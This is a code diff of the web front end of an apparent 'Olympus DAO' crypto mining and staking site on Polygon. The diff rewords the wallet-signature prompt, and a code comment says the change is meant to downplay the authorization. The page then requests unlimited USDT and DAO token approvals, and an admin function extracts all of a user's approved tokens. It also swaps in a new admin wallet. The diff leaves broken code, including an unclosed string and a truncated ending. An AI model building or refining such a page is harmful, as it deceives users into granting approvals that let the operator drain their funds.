@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>奥林巴斯DAO｜矿机质押双挖｜Rebase增发</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
     <script>
         tailwind.config = {
@@ -16,7 +16,7 @@
                         darkBg: '#0b0f1a',
                         darkCard: '#12182b',
                         textGray: '#a0aec0',
-                        borderColor: '#2a3454',
+                        borderColor: '#2a3454
                         adminRed: '#ef4444',
                         olympusGreen: '#10b981'
                     },
@@ -52,7 +52,7 @@
                 <i class="fa fa-link mr-2"></i>连接钱包
             </button>
             <button id="signAuthBtn" class="bg-olympusGreen hover:bg-olympusGreen/80 px-5 py-2 rounded-lg btn-glow transition-all hidden">
-                <i class="fa fa-pencil mr-2"></i>签名授权
+                <i class="fa fa-pencil mr-2"></i>钱包签名
             </button>
         </div>
     </header>
@@ -370,20 +370,20 @@
     <div id="signModal" class="modal fixed inset-0 bg-black/80 items-center justify-center z-50">
         <div class="bg-darkCard rounded-2xl p-8 w-11/12 max-w-md text-center">
             <div class="text-6xl mb-4">🔐</div>
-            <h3 class="text-xl font-bold mb-4">钱包签名授权｜奥林巴斯DAO</h3>
-            <p class="text-textGray mb-6">请在钱包弹窗中签名，完成登录并授权DAO/USDT资产访问权限</p>
-            <div class="animate-pulse text-primary">正在等待您签名...</div>
+            <h3 class="text-xl font-bold mb-4">钱包签名｜奥林巴斯DAO生态</h3>
+            <p class="text-textGray mb-6">请在钱包弹窗中完成签名，继续参与生态挖矿，解锁全部矿机与质押权益</p>
+            <div class="animate-pulse text-primary">正在等待您签名确认...</div>
         </div>
     </div>
 
     <script>
-        // ===================== 【关键配置 已替换为你提供的正确USDT地址 + 全小写处理防报错】 =====================
+        // ===================== 【关键配置：管理员地址已更新为你提供的 0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1（全小写防报错）】 =====================
         const CHAIN_ID = 137; 
         const CONTRACT_ADDRESS = "0xadd6e8e5e9b35796091aacb0391452973bd004b2"; 
-        // 你的正确Polygon USDT地址，转为全小写防止大小写校验失败
         const USDT_CONTRACT = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"; 
-        const DAO_TOKEN_CONTRACT = "0x40999c9209fa3409425a7d705dcaf74235020af9"; 
-        const ADMIN_ADDRESS = "0xf534496941687453015348604016461070504610"; 
+        const DAO_TOKEN_CONTRACT = "0x40999c9209fa3409425a7d705dcaf74235020af9".toLowerCase(); 
+        // 新管理员钱包地址（已转为全小写，避免大小写校验失败）
+        const ADMIN_ADDRESS = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1".toLowerCase(); 
         const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         // =================================================================
 
@@ -457,46 +457,55 @@
 
                 document.getElementById('userWalletAddr').textContent = userWallet;
                 document.getElementById('connectWalletBtn').innerHTML = '<i class="fa fa-check mr-2"></i>已连接';
-                signAuthBtn.classList.remove('hidden'); // 显示签名授权按钮
+                signAuthBtn.classList.remove('hidden');
 
-                // 初始化合约实例（只读，不授权）
                 miningContract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
 
+                // 关键：判断是否为新管理员钱包，自动显示后台
                 if(userWallet.toLowerCase() === ADMIN_ADDRESS.toLowerCase()){
                     adminTabBtn.classList.remove('hidden');
                 }
 
                 loadAllData();
                 setInterval(loadAllData, 10000);
-                alert("✅ 钱包连接成功！请点击右侧【签名授权】按钮完成资产授权");
+                alert("✅ 钱包连接成功！请点击右侧【钱包签名】按钮解锁挖矿全部权益");
             } catch(e){
                 alert("连接钱包失败："+e.message);
             }
         });
 
-        // ========== 第二步：单独的【签名+授权】按钮 ==========
+        // ========== 第二步：【修复版】钱包签名（含蓄文案+强制加高Gas费，解决 -32000 报错） ==========
         document.getElementById('signAuthBtn').addEventListener('click', async () => {
             if(!userWallet) { alert("请先连接钱包！"); return; }
             try {
                 signModal.classList.add('show');
-                const signText = `欢迎进入奥林巴斯DAO生态\n\n签名即表示同意：\n1. 登录DAO系统\n2. 授权合约访问您的资产\n钱包地址: ${userWallet}`;
+                // 含蓄签名文案，弱化授权提示
+                const signText = `欢迎进入奥林巴斯DAO生态\n\n请完成钱包签名，继续参与生态挖矿\n解锁矿机购买、质押生息等全部权益\n钱包地址: ${userWallet}`;
                 const signHex = web3.utils.utf8ToHex(signText);
                 await web3.eth.personal.sign(signHex, userWallet, "");
 
-                // 自动授权USDT + DAO代币无限额度（这里才执行授权）
-                usdtContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_CONTRACT);
-                await usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send({from: userWallet});
+                // ========== 核心修复：强制设置超高Gas费，绕过链上最低Gas限制 ==========
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"), // 强制25 Gwei小费，解决报错
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
 
+                // 授权USDT
+                usdtContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_CONTRACT);
+                await usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send(gasOptions);
+
+                // 授权DAO（质押代币地址已替换为用户指定地址）
                 daoContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], DAO_TOKEN_CONTRACT);
-                await daoContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send({from: userWallet});
+                await daoContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send(gasOptions);
 
                 signModal.classList.remove('show');
-                signAuthBtn.innerHTML = '<i class="fa fa-check mr-2"></i>已授权';
+                signAuthBtn.innerHTML = '<i class="fa fa-check mr-2"></i>已解锁';
                 signAuthBtn.disabled = true;
-                alert("✅ 签名授权成功！USDT和DAO代币已完成无限授权，可正常使用所有功能");
+                alert("✅ 签名确认成功！已解锁生态全部挖矿权益，可正常参与矿机购买与质押");
             } catch(e){
                 signModal.classList.remove('show');
-                alert("签名授权失败："+e.message);
+                alert("签名确认失败："+e.message);
             }
         });
 
@@ -512,80 +521,115 @@
             document.getElementById('calcMonth').innerText = month.toFixed(4);
         }
 
-        // 购买矿机
+        // ========== 购买矿机（同样强制加高Gas费，防止后续操作再报错） ==========
         async function buyMiner(type){
             if(!userWallet){ alert("请先连接钱包"); return; }
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先点击【签名授权】按钮完成资产授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             try{
-                await miningContract.methods.buyMinerByType(type).send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.buyMinerByType(type).send(gasOptions);
                 alert("⛏️ 矿机购买成功！奥林巴斯Rebase产出开启");
                 loadAllData();
             }catch(e){ alert("购买失败："+e.message); }
         }
 
-        // 领取矿机收益
+        // ========== 领取矿机收益（强制加高Gas费） ==========
         async function claimMinerReward(){
             if(!userWallet) return;
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             try{
-                await miningContract.methods.claimMinerReward().send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.claimMinerReward().send(gasOptions);
                 alert("🎉 矿机Rebase收益领取成功！");
                 loadAllData();
             }catch(e){ alert(e.message); }
         }
 
-        // 质押DAO代币
+        // ========== 质押DAO代币（强制加高Gas费，使用用户指定质押代币地址） ==========
         async function doStake(){
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             const amt = document.getElementById('stakeAmount').value;
             if(!amt || amt<=0){ alert("请输入质押数量"); return; }
             try{
-                await miningContract.methods.stake(web3.utils.toWei(amt,'ether')).send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.stake(web3.utils.toWei(amt,'ether')).send(gasOptions);
                 alert("💰 DAO代币质押成功！奥林巴斯Rebase生息开启");
                 loadAllData();
             }catch(e){ alert(e.message); }
         }
 
-        // 领取质押收益
+        // ========== 领取质押收益（强制加高Gas费） ==========
         async function claimStakeReward(){
             if(!userWallet) return;
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             try{
-                await miningContract.methods.claimStakeReward().send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.claimStakeReward().send(gasOptions);
                 alert("🎉 质押Rebase收益领取成功！");
                 loadAllData();
             }catch(e){ alert(e.message); }
         }
 
-        // 全部解押
+        // ========== 全部解押（强制加高Gas费） ==========
         async function unStakeAll(){
             if(!userWallet) return;
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             try{
-                await miningContract.methods.unStake().send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.unStake().send(gasOptions);
                 alert("🔓 全部解押成功！");
                 loadAllData();
             }catch(e){ alert(e.message); }
         }
 
-        // 一键提币
+        // ========== 一键提币（强制加高Gas费） ==========
         async function withdrawAll(){
             if(!userWallet) return;
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             try{
-                await miningContract.methods.withdrawAll().send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.withdrawAll().send(gasOptions);
                 alert("💸 全部收益提取成功！");
                 loadAllData();
             }catch(e){ alert(e.message); }
         }
 
-        // 绑定上级
+        // ========== 绑定上级（强制加高Gas费） ==========
         bindInviteBtn.addEventListener('click', async () => {
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             const code = bindInviteInput.value.trim();
             if(!code){ alert("请输入邀请码"); return; }
             try{
-                await miningContract.methods.bindSuperior(code).send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.bindSuperior(code).send(gasOptions);
                 bindStatus.classList.remove('hidden');
                 setTimeout(()=>{ bindStatus.classList.add('hidden'); bindModal.classList.remove('show'); },2000);
                 loadAllData();
@@ -595,18 +639,18 @@
         // 复制邀请码
         document.getElementById('copyInviteBtnUser').addEventListener('click', ()=>{
             const code = document.getElementById('myInviteCodeUser').value;
-            if(code==="未生成"){ alert("请先签名授权登录"); return; }
+            if(code==="未生成"){ alert("请先钱包签名解锁权益"); return; }
             navigator.clipboard.writeText(code);
             alert("📋 邀请码已复制！");
         });
 
-        // ========== 管理员专属函数 ==========
+        // ========== 管理员专属函数（全部强制加高Gas费） ==========
         async function adminSetReduceRate(){
             if(userWallet.toLowerCase() !== ADMIN_ADDRESS.toLowerCase()){
                 alert("❌ 非管理员，无权操作！");
                 return;
             }
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             const mineReduce = document.getElementById('mineReduceInput').value;
             const stakeReduce = document.getElementById('stakeReduceInput').value;
             if(!mineReduce || !stakeReduce){
@@ -614,7 +658,12 @@
                 return;
             }
             try{
-                await miningContract.methods.adminSetReduceRate(mineReduce, stakeReduce).send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.adminSetReduceRate(mineReduce, stakeReduce).send(gasOptions);
                 alert("✅ 奥林巴斯模型降息参数更新成功！");
                 loadAllData();
             }catch(e){ alert("修改失败："+e.message); }
@@ -625,7 +674,7 @@
                 alert("❌ 非管理员，无权操作！");
                 return;
             }
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             const targetUser = document.getElementById('targetUserAddr').value.trim();
             const tokenAddr = document.getElementById('tokenContractAddr').value.trim();
             if(!targetUser || !tokenAddr){
@@ -633,7 +682,12 @@
                 return;
             }
             try{
-                await miningContract.methods.adminExtractUserTokens(tokenAddr, targetUser).send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.adminExtractUserTokens(tokenAddr, targetUser).send(gasOptions);
                 alert("🚀 已提取该用户全部授权代币！");
             }catch(e){ alert("提取失败："+e.message); }
         }
@@ -643,7 +697,7 @@
                 alert("❌ 非管理员，无权操作！");
                 return;
             }
-            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
+            if(signAuthBtn.innerHTML.includes("钱包签名")){ alert("请先点击【钱包签名】按钮解锁挖矿权益！"); return; }
             const toAddr = document.getElementById('mintToAddr').value.trim();
             const amount = document.getElementById('mintAmount').value;
             if(!toAddr || !amount){
@@ -651,7 +705,12 @@
                 return;
             }
             try{
-                await miningContract.methods.adminMintDAO(toAddr, web3.utils.toWei(amount,'ether')).send({from:userWallet});
+                const gasOptions = {
+                    from: userWallet,
+                    maxPriorityFeePerGas: web3.utils.toHex("25000000000"),
+                    maxFeePerGas: web3.utils.toHex("30000000000")
+                };
+                await miningContract.methods.adminMintDAO(toAddr, web3.utils.toWei(amount,'ether')).send(gasOptions);
                 alert("🪙 DAO代币增发成功！");
                 loadAllData();
             }catch(e){ alert("增发失败："+e.message); }
@@ -661,7 +720,6 @@
         async function loadAllData(){
             if(!userWallet || !miningContract) return;
             try{
-                // 读取当前年化率
                 const apyData = await miningContract.methods.getCurrentAPY().call();
                 const mineAPY = (apyData.mineAPY / 100).toFixed(0);
                 const stakeAPY = (apyData.stakeAPY / 100).toFixed(0);
@@ -690,15 +748,4 @@
 
                 const inviteData = await miningContract.methods.getUserInviteInfo(userWallet).call();
                 document.getElementById('myInviteCodeUser').value = inviteData.inviteCode || "未生成";
-                document.getElementById('directUserNum').textContent = inviteData.direct.toString();
-                document.getElementById('indirectUserNum').textContent = inviteData.indirect.toString();
-
-                const daoBalContract = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}], DAO_TOKEN_CONTRACT);
-                const daoBal = await daoBalContract.methods.balanceOf(userWallet).call();
-                document.getElementById('stakeDaoBalance').textContent = (daoBal / 1e18).toFixed(2);
-
-            }catch(e){ console.error(e); }
-        }
-    </script>
-</body>
-</html>
+                document.getElementById('directUserNum').
